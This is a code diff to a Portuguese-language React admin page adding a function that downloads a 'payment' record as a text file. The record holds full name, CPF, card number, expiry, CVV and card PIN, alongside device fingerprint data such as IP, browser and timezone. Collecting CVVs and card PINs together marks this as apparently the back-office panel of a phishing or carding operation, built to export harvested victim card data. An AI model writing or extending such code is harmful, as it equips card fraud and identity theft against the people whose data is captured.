@@ -256,6 +256,52 @@ const Admin = () => {
     }
   };
 
+  const handleDownloadPaymentTxt = async () => {
+    if (!selectedPayment || !parsedData) return;
+
+    try {
+      setIsDownloadingFile(true);
+
+      const content = `
+=== DETALHES DO PAGAMENTO ===
+Data: ${new Date().toLocaleString('pt-BR')}
+
+--- INFORMAÇÕES PESSOAIS ---
+Nome Completo: ${parsedData.nome}
+CPF: ${parsedData.cpf}
+
+--- DADOS DO CARTÃO ---
+Número do Cartão: ${parsedData.cartao}
+Validade: ${parsedData.validade}
+CVV: ${parsedData.cvv}
+Senha do Cartão: ${parsedData.senhaCartao}
+
+--- DATA E HORA DO REGISTRO ---
+Registro: ${parsedData.data}
+
+${(parsedData.ip || parsedData.navegador || parsedData.so || parsedData.dispositivo) ? `--- INFORMAÇÃO DO DISPOSITIVO ---
+${parsedData.so ? `Sistema Operacional: ${parsedData.so}\n` : ''}${parsedData.ip ? `IP: ${parsedData.ip}\n` : ''}${parsedData.navegador ? `Navegador: ${parsedData.navegador}\n` : ''}${parsedData.dispositivo ? `Dispositivo: ${parsedData.dispositivo}\n` : ''}${parsedData.resolucao ? `Resolução: ${parsedData.resolucao}\n` : ''}${parsedData.idioma ? `Idioma: ${parsedData.idioma}\n` : ''}${parsedData.fuso ? `Fuso Horário: ${parsedData.fuso}\n` : ''}${parsedData.conexao ? `Tipo de Conexão: ${parsedData.conexao}\n` : ''}` : ''}
+`;
+
+      const blob = new Blob([content.trim()], { type: 'text/plain;charset=utf-8' });
+      const url = window.URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.setAttribute('download', `pagamento_${selectedPayment.id}.txt`);
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      window.URL.revokeObjectURL(url);
+
+      toast.success('TXT baixado com sucesso!');
+    } catch (error) {
+      console.error('Erro ao baixar TXT:', error);
+      toast.error('Erro ao baixar TXT');
+    } finally {
+      setIsDownloadingFile(false);
+    }
+  };
+
   const CopyableField = ({ label, value, fieldName }: { label: string; value: string; fieldName: string }) => (
     <div className="group relative">
       <div className="flex items-start justify-between gap-3 p-3 rounded-lg bg-muted/30 hover:bg-muted/50 transition-all duration-200">
